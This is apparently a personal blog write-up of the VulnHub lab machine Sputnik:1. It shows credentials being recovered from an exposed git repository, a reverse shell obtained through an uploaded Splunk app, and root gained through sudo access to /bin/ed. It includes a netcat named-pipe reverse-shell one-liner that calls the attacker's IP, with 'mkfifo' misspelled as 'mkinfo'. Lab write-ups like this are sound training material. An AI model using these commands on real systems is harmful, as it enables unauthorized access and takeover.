---
layout: post
---

# [VulnHub] Sputnik:1 WriteUp

I solved boot2root machine today.Machine level was easy.
It was fun machine.Lets start

### Tools

* netdiscover
* nmap
* git
* nc
* ed (for root)

### Steps

I detected target ip : `netdiscover -r 192.168.88.0/24` . Network adapterwas Nat mode.

![deneme](/img/sputnik/1.png)

And I did nmap scanning to see what happen is it have network side.
I found `.git` directory on port `55555` .Maybe I can find credential .

![deneme](/img/sputnik/2.png)

I looked for  git directory deeply and I found repository address.

![deneme](/img/sputnik/3.png)

I downloaded the repo to my pc .And I searched the directory .

![deneme](/img/sputnik/4.png)

I decided to look logs . And I saw different tag : `secret` .

![deneme](/img/sputnik/5.png)

I went to commit And I saw something like creds.

![deneme](/img/sputnik/6.png)

I tried the creds on login page and I could login.

![deneme](/img/sputnik/7.png)

When I logon the server I saw `splunk` name and searched in google for how I get reverse shell.
I gone the first link and I did what there is wrights on readme page . 

![deneme](/img/sputnik/8.png)

First one I downloaded `splunk_shells-1.2.tar.gz` file for upload to page.I cliecked `install app from file` .

![deneme](/img/sputnik/9.png)

I selected my file and uploaded .

![deneme](/img/sputnik/10.png)

I fixed permissions settings and I did for `All apps` and saved .

![deneme](/img/sputnik/11.png)

I was need to call the page for get reverse shell and I wrote the line:
`| revshell std my_ip my_port` .

![deneme](/img/sputnik/12.png)

I got reverse shell with `nc` .But the shell didnt work right so I was need to lead the another shell .
So I used the line : `rm /tmp/f;mkinfo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.88.128 1234 >/tmp/f` .

![deneme](/img/sputnik/13.png)

This time worked correctly the shell.And I got connection.And started enumerating os.
I did my favorite enumeration `sudo -l` . I found a command: `/bin/ed` .Honestly I saw first time the command .
So I didnt know anything about that .
![deneme](/img/sputnik/14.png)

It was text editor. I googlied the command rapidly .I didnt find something but I remembered
the tool was like `vim` .And I tried same thing When I use `vim` and worked .I got root and read flag. 

![deneme](/img/sputnik/15.png)

### Summary:

I liked the box .Because there was have `git` and I saw `/bin/ed` first time at least different thing.
Have a good hacks .See you next machines :)

[back](./)